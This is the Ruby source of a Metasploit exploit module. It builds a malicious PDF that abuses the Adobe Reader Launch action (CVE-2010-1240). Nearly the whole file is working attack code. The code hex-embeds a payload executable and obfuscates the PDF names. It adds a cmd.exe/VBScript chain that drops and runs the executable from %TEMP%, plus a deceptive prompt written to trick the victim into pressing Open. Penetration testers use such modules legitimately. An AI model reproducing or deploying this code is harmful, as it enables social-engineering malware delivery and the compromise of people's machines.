##
# $Id: adobe_pdf_embedded_exe_nojs.rb 11353 2010-12-16 20:11:01Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

#
# Modified version of the Adobe PDF Embedded EXE Social Engineering "adobe_pdf_embedded_exe.rb".
# This version does not require JavaScript to be enabled and does not required the EXE to be
# attached to the PDF.  The EXE is embedded in the PDF in a non-standard method using HEX
# encoding.
#
# Lots of reused code from adobe_pdf_embedded_exe.rb and the other PDF modules to make the PDF.
# Thanks to all those that wrote the code for those modules, as I probably could not have
# wrote this module without borrowing code from them.
#


require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'Adobe PDF Escape EXE Social Engineering (No JavaScript)',
			'Description' 	=> %q{
					This module embeds a Metasploit payload into an existing PDF file in
				a non-standard method. The resulting PDF can be sent to a target as
				part of a social engineering attack.
			},
			'License'	=> MSF_LICENSE,
			'Author'	   =>
				[
					'Jeremy Conway <jeremy[at]sudosecure.net>',
				],
			'Version'        => '$Revision: 11353 $',
			'References'     =>
				[
					[ 'CVE', '2010-1240' ],
					[ 'OSVDB', '63667' ],
					[ 'URL', 'http://blog.didierstevens.com/2010/04/06/update-escape-from-pdf/' ],
					[ 'URL', 'http://blog.didierstevens.com/2010/03/31/escape-from-foxit-reader/' ],
					[ 'URL', 'http://blog.didierstevens.com/2010/03/29/escape-from-pdf/' ]
				],
			'Payload'	=>
				{
					'Space'			   => 2048,
					'DisableNops'		=> true,
					'StackAdjustment'	=> -3500,
				},
			'Platform'	=> 'win',
			'Targets'	=>
				[
					[ 'Adobe Reader <= v9.3.3 (Windows XP SP3 English)', { 'Ret' => '' } ]
				],
			'DefaultTarget'	=> 0))

		register_options(
			[
				OptString.new('EXENAME', [ false, 'The Name of payload exe.', 'msf.exe']),
				OptString.new('FILENAME', [ false, 'The output filename.', 'evil.pdf']),
				OptString.new('LAUNCH_MESSAGE', [ false, 'The message to display in the File: area',
					"To view the encrypted content please tick the \"Do not show this message again\" box and press Open."]),
			], self.class)
	end

	def exploit

		# Create the pdf
		print_status("Making PDF")
		pdf = make_pdf()
		print_status("Creating '#{datastore['FILENAME']}' file...")
		file_create(pdf)
	end

	def pdf_exe(payload_exe)

		if !(payload_exe and payload_exe.length > 0)
			print_status("Using '#{datastore['PAYLOAD']}' as payload...")
			payload_exe = generate_payload_exe
			hex_payload = Rex::Text.to_hex(payload_exe)
		else
			print_status("Using '#{datastore['EXENAME']}' as payload...")
			hex_payload = Rex::Text.to_hex_dump(payload_exe,16)
		end

		return hex_payload
	end

	def ioDef(id)
		"%d 0 obj" % id
	end

	def ioRef(id)
		"%d 0 R" % id
	end

	#http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
	def nObfu(str)
		result = ""
		str.scan(/./u) do |c|
			if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'
				result << "#%x" % c.unpack("C*")[0]
			else
				result << c
			end
		end
		result
	end

	def ASCIIHexWhitespaceEncode(str)
		result = ""
		whitespace = ""
		str.each_byte do |b|
			result << whitespace << "%02x" % b
			whitespace = " " * (rand(3) + 1)
		end
		result << ">"
	end

	def make_pdf()

		file_name = datastore['FILENAME']
		exe_name = datastore['EXENAME']
		launch_msg = datastore['LAUNCH_MESSAGE']

		xref = []
		eol = "\x0d\x0a"
		endobj = "endobj" << eol

		pdf = "%PDF-1.5" << eol
		payload_exe = generate_payload_exe
		hex_payload = Rex::Text.to_hex(payload_exe)
		pdf << hex_payload << eol
		pdf << ioDef(1) << nObfu("<</Type/Catalog/Outlines ") << ioRef(2) << nObfu("/Pages ") << ioRef(3) << nObfu("/OpenAction ") << ioRef(5) << ">>" << endobj
		xref << pdf.length
		pdf << ioDef(2) << nObfu("<</Type/Outlines/Count 0>>") << endobj
		xref << pdf.length
		pdf << ioDef(3) << nObfu("<</Type/Pages/Kids[") << ioRef(4) << nObfu("]/Count 1>>") << endobj
		xref << pdf.length
		pdf << ioDef(4) << nObfu("<</Type/Page/Parent ") << ioRef(3) << nObfu("/MediaBox[0 0 612 792]>>") << endobj
		xref << pdf.length
		pdf << ioDef(5) << nObfu("<</Type/Action/S/Launch/Win ") << "<< "
		pdf << "/F (cmd.exe) /P (/C echo Set o=CreateObject^(\"Scripting.FileSystemObject\"^):Set f=o.OpenTextFile^(\"#{file_name}\",1,True^):"
		pdf << "f.SkipLine:Set w=CreateObject^(\"WScript.Shell\"^):Set g=o.OpenTextFile^(w.ExpandEnvironmentStrings^(\"%TEMP%\"^)+\"\\\\#{exe_name}\",2,True^):a=Split^(Trim^(Replace^(f.ReadLine,\"\\\\x\",\" \"^)^)^):"
		pdf << "for each x in a:g.Write^(Chr^(\"&h\" ^& x^)^):next:g.Close:f.Close > 1.vbs && cscript //B 1.vbs && start %TEMP%\\\\#{exe_name} && del /F 1.vbs"
		pdf << eol << eol << eol << "#{launch_msg})"
		pdf << ">>>>" << endobj
		xref << pdf.length
		xrefPosition = pdf.length
		pdf << "xref" << eol
		pdf << "0 %d" % (xref.length + 1) << eol
		pdf << "0000000000 65535 f" << eol
		xref.each do |index|
			pdf << "%010d 00000 n" % index << eol
		end
		pdf << "trailer" << nObfu("<</Size %d/Root " % (xref.length + 1)) << ioRef(1) << ">>" << eol
		pdf << "startxref" << eol
		pdf << xrefPosition.to_s() << eol
		pdf << "%%EOF" << eol

	end
end
